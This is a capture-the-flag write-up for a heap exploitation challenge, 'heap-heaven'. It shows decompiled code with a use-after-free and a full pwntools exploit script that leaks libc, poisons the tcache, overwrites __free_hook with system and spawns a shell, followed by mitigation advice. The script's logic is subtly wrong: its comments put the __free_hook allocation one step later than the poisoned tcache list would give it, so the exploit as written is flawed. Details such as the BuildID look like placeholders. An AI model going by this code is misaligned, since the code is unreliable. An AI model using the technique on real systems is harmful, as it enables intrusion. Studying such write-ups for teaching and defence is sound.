heap-heaven - DEF CON 31 CTF

Category: pwn Points: 450 Solves: 12 First Blood: ✅ eternalmarathon

Challenge Description

Heaven is a place where memory allocations never fail and heap chunks are always perfectly aligned.
Unfortunately, this isn't heaven.

nc heap-heaven.ctf.defcon.org 31337

Files: heap-heaven, libc.so.6

Initial Analysis

Let’s start by examining the binary:

$ file heap-heaven
heap-heaven: ELF 64-bit LSB executable, x86-64, dynamically linked, for GNU/Linux 3.2.0, BuildID[sha1]=abc123, not stripped

$ checksec heap-heaven
[*] '/path/to/heap-heaven'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '.'

The binary has all protections enabled, so we’ll need to find a way around them.

Static Analysis

Opening the binary in Ghidra, we can see the main functionality:

void main() {
    setup();
    puts("Welcome to heap heaven!");

    while (1) {
        menu();
        int choice = get_int();

        switch (choice) {
            case 1: allocate_chunk(); break;
            case 2: free_chunk(); break;
            case 3: edit_chunk(); break;
            case 4: view_chunk(); break;
            case 5: exit(0); break;
            default: puts("Invalid choice"); break;
        }
    }
}

The key functions are:

allocate_chunk()

void allocate_chunk() {
    int idx = get_index();
    if (chunks[idx] != NULL) {
        puts("Chunk already allocated");
        return;
    }

    int size = get_int();
    if (size > 0x500) {
        puts("Size too large");
        return;
    }

    chunks[idx] = malloc(size);
    sizes[idx] = size;
    puts("Chunk allocated");
}

free_chunk()

void free_chunk() {
    int idx = get_index();
    if (chunks[idx] == NULL) {
        puts("Chunk not allocated");
        return;
    }

    free(chunks[idx]);
    // BUG: chunks[idx] not set to NULL!
    puts("Chunk freed");
}

edit_chunk()

void edit_chunk() {
    int idx = get_index();
    if (chunks[idx] == NULL) {
        puts("Chunk not allocated");
        return;
    }

    read(0, chunks[idx], sizes[idx]);
    puts("Chunk edited");
}

Vulnerability Analysis

The primary vulnerability is a Use-After-Free in the free_chunk() function. After calling free(), the pointer in the chunks array is not set to NULL, allowing us to:

  1. Edit freed chunks (leading to heap metadata corruption)
  2. View freed chunks (potential info leak)
  3. Double-free chunks

Exploitation Strategy

Given the libc version (2.31), we can use the following approach:

  1. Leak libc addresses using unsorted bin chunks
  2. Tcache poisoning to gain arbitrary write
  3. Overwrite __free_hook with system
  4. Trigger shell by freeing a chunk containing “/bin/sh”

Exploitation Implementation

#!/usr/bin/env python3
from pwn import *

# Setup
context.arch = 'amd64'
context.log_level = 'debug'

# Connection
if args.REMOTE:
    p = remote('heap-heaven.ctf.defcon.org', 31337)
else:
    p = process('./heap-heaven')

# Helper functions
def allocate(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# Step 1: Leak libc base
log.info("Step 1: Leaking libc base address")

# Create chunks to prevent consolidation with top chunk
allocate(0, 0x420)  # Large chunk for unsorted bin
allocate(1, 0x20)   # Prevent consolidation
allocate(2, 0x20)   # Guard chunk

# Free large chunk to unsorted bin
free(0)

# View freed chunk to leak libc addresses
view(0)
p.recvuntil(b'Data: ')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base
libc_base = leak - 0x1ebbe0  # unsorted_bin offset for libc 2.31
system = libc_base + 0x55410
free_hook = libc_base + 0x1eee48

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"system: {hex(system)}")
log.success(f"__free_hook: {hex(free_hook)}")

# Step 2: Tcache poisoning
log.info("Step 2: Performing tcache poisoning")

# Allocate chunks for tcache poisoning
allocate(3, 0x60)
allocate(4, 0x60)
allocate(5, 0x60)

# Free chunks to fill tcache
free(3)
free(4)
free(5)

# Use-after-free to corrupt tcache linked list
edit(5, p64(free_hook))

# Step 3: Get arbitrary write
log.info("Step 3: Getting arbitrary write primitive")

# Allocate to get back chunk 5
allocate(6, 0x60)

# Allocate to get back chunk 4
allocate(7, 0x60)

# Now allocate to get chunk at __free_hook
allocate(8, 0x60)

# Write system address to __free_hook
edit(8, p64(system))

# Step 4: Get shell
log.info("Step 4: Getting shell")

# Allocate chunk with "/bin/sh"
allocate(9, 0x20)
edit(9, b"/bin/sh\x00")

# Free chunk containing "/bin/sh" to trigger system("/bin/sh")
free(9)

# Shell!
p.interactive()

Key Insights

  1. Use-After-Free vulnerabilities in heap managers can lead to powerful primitives
  2. Tcache poisoning is effective against newer libc versions when you can corrupt tcache metadata
  3. Modern heap exploitation requires careful management of heap state and understanding of allocator internals
  4. First blood requires speed - having pre-written exploitation templates helps significantly

Mitigation

The vulnerability could be prevented by:

  • Setting pointers to NULL after freeing
  • Implementing proper bounds checking
  • Using memory-safe languages or smart pointers
  • Enabling additional heap protections (e.g., GWP-ASan)
